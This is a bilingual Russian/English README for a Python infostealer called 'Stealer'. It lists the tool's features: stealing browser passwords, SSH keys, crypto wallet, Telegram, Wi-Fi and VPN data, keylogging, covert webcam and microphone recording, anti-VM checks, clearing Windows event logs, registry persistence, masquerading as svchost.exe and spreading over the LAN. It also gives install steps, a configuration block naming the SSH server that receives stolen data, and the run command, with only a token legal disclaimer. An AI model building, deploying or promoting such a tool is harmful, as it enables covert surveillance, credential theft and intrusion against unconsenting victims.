# Stealer-Стиллер 
# Data Collection Tool

## Описание / Description
Программа для сбора системной информации, файлов, данных браузеров и Telegram, а также записи аудио и видео с веб-камеры. Собранные данные архивируются и загружаются на SSH-сервер.

A tool for collecting system information, files, browser and Telegram data, plus recording audio and webcam video. Collected data is archived and uploaded to an SSH server.

## Особенности / Features
```
Сбор системной информации (ОС, процессор, сеть и т.д.) / System info collection (OS, CPU, network etc.)
Запись звука с микрофона / Audio recording from microphone
Запись видео с веб-камеры / Webcam video recording
Сбор файлов указанных расширений / File collection by extensions
Сбор данных браузеров (Chrome, Firefox) / Browser data collection
Сбор данных Telegram / Telegram data collection
Сбор SSH ключей / SSH keys collection
Сбор данных о крипто кошельках / Cryptocurrency wallets detection
Архивация в ZIP / ZIP archiving
Загрузка на SSH-сервер / SSH server upload
Скрытый режим работы / Stealth mode
Сбор паролей из браузеров / Browser passwords collection
Сбор конфигураций VPN (OpenVPN, NordVPN и др.) / VPN configs collection
Сбор SSH-конфигураций / SSH configs collection
Сбор данных буфера обмена / Clipboard data collection
Очистка журналов событий Windows / Windows event logs clearing
Улучшенное скрытие в системе / Enhanced stealth
Добавление в автозагрузку Windows (реестр + ярлык) / Windows startup persistence (registry + shortcut)
Проверка на работу в виртуальной машине / Anti-VM detection
Сбор истории браузеров (Chrome) / Browser history collection (Chrome)
Сбор сохранённых паролей Wi-Fi / Wi-Fi passwords collection
Определение активного окна / Active window detection
Логирование активности пользователя (мышь, клавиатура) / User activity logging
Определение геолокации по IP / Geolocation via IP
Маскировка под системный файл и установка атрибута HIDDEN / Masquerade as system file with hidden attribute
Самокопирование в %APPDATA%\svchost.exe / Self-copy to %APPDATA%\svchost.exe
Кража данных игровых лаунчеров (Steam, Origin, Epic Games) / Game launchers data theft
Распространение по локальной сети через net use / LAN propagation via net use
```
## Требования / Requirements
- Python 3.6+
- Windows/Linux/macOS

## Установка зависимостей / Dependencies Installation
```
pip install pyautogui opencv-python pyaudio paramiko psutil pywin32
```
Для Linux может потребоваться установка дополнительных пакетов:
For Linux you may need to install additional packages:


# Для Ubuntu/Debian
```
sudo apt install python3-dev portaudio19-dev libasound2-dev
```
Конфигурация / Configuration
Отредактируйте параметры в начале скрипта:
Edit settings at the top of the script:

```
# SSH settings
SSH_HOST = ""               
SSH_PORT = 22               
SSH_USERNAME = ""           
SSH_PASSWORD = ""           
REMOTE_PATH = "/home/user/uploads"

# Recording settings              
AUDIO_RECORD_DURATION = 10  
WEBCAM_RECORD_DURATION = 10 

# File collection
FILE_EXTENSIONS = ('.txt', '.pdf', '.doc', '.docx')
MAX_FILES_TO_COLLECT = 50

# Other settings
MAX_TELEGRAM_FOLDER_SIZE = 600
HIDE_CONSOLE = True
RUN_AS_DAEMON = True
```
Запуск / Execution
```
python gitver.py
```
В скрытом режиме (Windows) программа не показывает никаких окон.
In stealth mode (Windows) the program runs without showing any windows.

Предупреждение / Warning
Используйте эту программу только в законных целях и только на компьютерах, где у вас есть разрешение. Не нарушайте законы о конфиденциальности.

Use this program only for legitimate purposes and only on computers you have permission to access. Do not violate privacy laws.
```
